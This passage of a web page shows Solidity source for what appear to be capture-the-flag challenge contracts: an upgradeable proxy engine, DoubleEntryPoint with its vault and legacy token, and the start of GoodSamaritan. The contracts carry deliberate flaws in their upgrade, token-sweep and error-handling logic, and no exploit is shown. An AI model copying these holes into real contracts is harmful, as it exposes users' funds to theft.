    <span class="token comment">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span>
    <span class="token builtin">bytes32</span> <span class="token keyword">internal</span> <span class="token keyword">constant</span> _IMPLEMENTATION_SLOT <span class="token operator">=</span> <span class="token number">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="token punctuation">;</span>

    <span class="token builtin">address</span> <span class="token keyword">public</span> upgrader<span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> <span class="token keyword">public</span> horsePower<span class="token punctuation">;</span>

    <span class="token keyword">struct</span> <span class="token class-name">AddressSlot</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> initializer <span class="token punctuation">{</span>
        horsePower <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>
        upgrader <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Upgrade the implementation of the proxy to \`newImplementation\`</span>
    <span class="token comment">// subsequently execute the function call</span>
    <span class="token keyword">function</span> <span class="token function">upgradeToAndCall</span><span class="token punctuation">(</span><span class="token builtin">address</span> newImplementation<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token function">_authorizeUpgrade</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">_upgradeToAndCall</span><span class="token punctuation">(</span>newImplementation<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Restrict to upgrader role</span>
    <span class="token keyword">function</span> <span class="token function">_authorizeUpgrade</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">view</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> upgrader<span class="token punctuation">,</span> <span class="token string">&quot;Can&#39;t upgrade&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span>
    <span class="token keyword">function</span> <span class="token function">_upgradeToAndCall</span><span class="token punctuation">(</span><span class="token builtin">address</span> newImplementation<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> data<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token punctuation">{</span>
        <span class="token comment">// Initial upgrade and setup call</span>
        <span class="token function">_setImplementation</span><span class="token punctuation">(</span>newImplementation<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> newImplementation<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">&quot;Call failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Stores a new address in the EIP1967 implementation slot.</span>
    <span class="token keyword">function</span> <span class="token function">_setImplementation</span><span class="token punctuation">(</span><span class="token builtin">address</span> newImplementation<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>Address<span class="token punctuation">.</span><span class="token function">isContract</span><span class="token punctuation">(</span>newImplementation<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        AddressSlot <span class="token keyword">storage</span> r<span class="token punctuation">;</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
            r_slot <span class="token operator">:=</span> _IMPLEMENTATION_SLOT
        <span class="token punctuation">}</span>
        r<span class="token punctuation">.</span>value <span class="token operator">=</span> newImplementation<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="doubleentrypoint" tabindex="-1"><a class="header-anchor" href="#doubleentrypoint" aria-hidden="true">#</a> DoubleEntryPoint</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-08/access/Ownable.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">DelegateERC20</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">delegateTransfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> value<span class="token punctuation">,</span> <span class="token builtin">address</span> origSender<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">interface</span> <span class="token class-name">IDetectionBot</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">handleTransaction</span><span class="token punctuation">(</span><span class="token builtin">address</span> user<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">calldata</span> msgData<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">interface</span> <span class="token class-name">IForta</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">setDetectionBot</span><span class="token punctuation">(</span><span class="token builtin">address</span> detectionBotAddress<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">notify</span><span class="token punctuation">(</span><span class="token builtin">address</span> user<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">calldata</span> msgData<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">raiseAlert</span><span class="token punctuation">(</span><span class="token builtin">address</span> user<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Forta</span> <span class="token keyword">is</span> IForta <span class="token punctuation">{</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> IDetectionBot<span class="token punctuation">)</span> <span class="token keyword">public</span> usersDetectionBots<span class="token punctuation">;</span>
    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> botRaisedAlerts<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">setDetectionBot</span><span class="token punctuation">(</span><span class="token builtin">address</span> detectionBotAddress<span class="token punctuation">)</span> <span class="token keyword">external</span> override <span class="token punctuation">{</span>
        usersDetectionBots<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">IDetectionBot</span><span class="token punctuation">(</span>detectionBotAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">notify</span><span class="token punctuation">(</span><span class="token builtin">address</span> user<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">calldata</span> msgData<span class="token punctuation">)</span> <span class="token keyword">external</span> override <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>usersDetectionBots<span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
        try usersDetectionBots<span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">handleTransaction</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> msgData<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> catch <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">raiseAlert</span><span class="token punctuation">(</span><span class="token builtin">address</span> user<span class="token punctuation">)</span> <span class="token keyword">external</span> override <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>usersDetectionBots<span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
        botRaisedAlerts<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">CryptoVault</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> sweptTokensRecipient<span class="token punctuation">;</span>
    IERC20 <span class="token keyword">public</span> underlying<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> recipient<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        sweptTokensRecipient <span class="token operator">=</span> recipient<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">setUnderlying</span><span class="token punctuation">(</span><span class="token builtin">address</span> latestToken<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>underlying<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;Already set&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        underlying <span class="token operator">=</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>latestToken<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
    ...
    */</span>

    <span class="token keyword">function</span> <span class="token function">sweepToken</span><span class="token punctuation">(</span>IERC20 token<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>token <span class="token operator">!=</span> underlying<span class="token punctuation">,</span> <span class="token string">&quot;Can&#39;t transfer underlying token&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        token<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>sweptTokensRecipient<span class="token punctuation">,</span> token<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">LegacyToken</span> <span class="token keyword">is</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">&quot;LegacyToken&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;LGT&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Ownable <span class="token punctuation">{</span>
    DelegateERC20 <span class="token keyword">public</span> delegate<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">mint</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>
        <span class="token function">_mint</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">delegateToNewContract</span><span class="token punctuation">(</span>DelegateERC20 newContract<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>
        delegate <span class="token operator">=</span> newContract<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> value<span class="token punctuation">)</span> <span class="token keyword">public</span> override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>delegate<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> super<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> delegate<span class="token punctuation">.</span><span class="token function">delegateTransfer</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> value<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">DoubleEntryPoint</span> <span class="token keyword">is</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">&quot;DoubleEntryPointToken&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;DET&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> DelegateERC20<span class="token punctuation">,</span> Ownable <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> cryptoVault<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> player<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> delegatedFrom<span class="token punctuation">;</span>
    Forta <span class="token keyword">public</span> forta<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> legacyToken<span class="token punctuation">,</span> <span class="token builtin">address</span> vaultAddress<span class="token punctuation">,</span> <span class="token builtin">address</span> fortaAddress<span class="token punctuation">,</span> <span class="token builtin">address</span> playerAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        delegatedFrom <span class="token operator">=</span> legacyToken<span class="token punctuation">;</span>
        forta <span class="token operator">=</span> <span class="token function">Forta</span><span class="token punctuation">(</span>fortaAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
        player <span class="token operator">=</span> playerAddress<span class="token punctuation">;</span>
        cryptoVault <span class="token operator">=</span> vaultAddress<span class="token punctuation">;</span>
        <span class="token function">_mint</span><span class="token punctuation">(</span>cryptoVault<span class="token punctuation">,</span> <span class="token number">100</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">onlyDelegateFrom</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> delegatedFrom<span class="token punctuation">,</span> <span class="token string">&quot;Not legacy contract&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">fortaNotify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span> detectionBot <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>forta<span class="token punctuation">.</span><span class="token function">usersDetectionBots</span><span class="token punctuation">(</span>player<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Cache old number of bot alerts</span>
        <span class="token builtin">uint256</span> previousValue <span class="token operator">=</span> forta<span class="token punctuation">.</span><span class="token function">botRaisedAlerts</span><span class="token punctuation">(</span>detectionBot<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Notify Forta</span>
        forta<span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span>player<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Continue execution</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>

        <span class="token comment">// Check if alarms have been raised</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>forta<span class="token punctuation">.</span><span class="token function">botRaisedAlerts</span><span class="token punctuation">(</span>detectionBot<span class="token punctuation">)</span> <span class="token operator">&gt;</span> previousValue<span class="token punctuation">)</span> <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token string">&quot;Alert has been triggered, reverting&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">delegateTransfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> value<span class="token punctuation">,</span> <span class="token builtin">address</span> origSender<span class="token punctuation">)</span>
        <span class="token keyword">public</span>
        override
        onlyDelegateFrom
        fortaNotify
        <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">_transfer</span><span class="token punctuation">(</span>origSender<span class="token punctuation">,</span> to<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="goodsamaritan" tabindex="-1"><a class="header-anchor" href="#goodsamaritan" aria-hidden="true">#</a> GoodSamaritan</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">&gt;=</span><span class="token version number">0.8.0</span> <span class="token operator">&lt;</span><span class="token version number">0.9.0</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-08/utils/Address.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">GoodSamaritan</span> <span class="token punctuation">{</span>
    Wallet <span class="token keyword">public</span> wallet<span class="token punctuation">;</span>
    Coin <span class="token keyword">public</span> coin<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        wallet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Wallet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        coin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Coin</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>wallet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        wallet<span class="token punctuation">.</span><span class="token function">setCoin</span><span class="token punctuation">(</span>coin<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">requestDonation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span> enoughBalance<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// donate 10 coins to requester</span>
        try wallet<span class="token punctuation">.</span><span class="token function">donate10</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> catch <span class="token punctuation">(</span><span class="token builtin">bytes</span> <span class="token keyword">memory</span> err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">&quot;NotEnoughBalance()&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// send the coins left</span>
                wallet<span class="token punctuation">.</span><span class="token function">transferRemainder</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Coin</span> <span class="token punctuation">{</span>
    <span class="token keyword">using</span> <span class="token class-name">Address</span> <span class="token keyword">for</span> <span class="token builtin">address</span><span class="token punctuation">;</span>

    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>

    error <span class="token function">InsufficientBalance</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> current<span class="token punctuation">,</span> <span class="token builtin">uint256</span> required<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> wallet_<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// one million coins for Good Samaritan initially</span>
        balances<span class="token punctuation">[</span>wallet_<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">**</span> <span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> dest_<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount_<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint256</span> currentBalance <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment">// transfer only occurs if balance is enough</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>amount_ <span class="token operator">&lt;=</span> currentBalance<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount_<span class="token punctuation">;</span>
            balances<span class="token punctuation">[</span>dest_<span class="token punctuation">]</span> <span class="token operator">+=</span> amount_<span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>dest_<span class="token punctuation">.</span><span class="token function">isContract</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// notify contract</span>
                <span class="token function">INotifyable</span><span class="token punctuation">(</span>dest_<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span>amount_<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
